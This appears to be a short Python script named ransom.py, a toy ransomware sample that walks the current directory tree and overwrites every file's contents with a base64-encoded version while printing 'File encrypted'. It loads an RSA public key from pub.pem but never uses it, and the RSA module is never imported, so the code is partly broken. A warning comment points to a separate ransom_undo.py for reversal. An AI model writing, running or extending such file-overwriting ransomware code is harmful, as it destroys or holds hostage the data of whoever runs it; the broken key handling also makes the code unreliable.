import os, base64
root_dir = os.getcwd()

### DON'T RUN THIS PROGRAM UNLESS YOU WANT TO ENCRYPT THE FILES IN THIS DIR AND SUBDIRS ###
### RUN ransom_undo.py TO DECRYPT ALL YOUR FILES ###

### base64 encodes file contents ###
def encrypt(dir, filen):
	if filen != "ransom.py" and filen !="ransom_undo.py" and filen != "ransom_check.py":
		file = open(dir + "/" + filen)
		contents = file.read()
		file.close()
		file = open( dir + "/" + filen, "w")
		file.write( base64.b64encode(contents) )
		file.close()
		print("File encrypted: " + dir + "/" + filen)


public_rsa = RSA.importKey(open("pub.pem", "r"))

### encrypting all files  ###
for subdir, dirs, files in os.walk(root_dir):
	for file in files:
		encrypt(subdir, file)
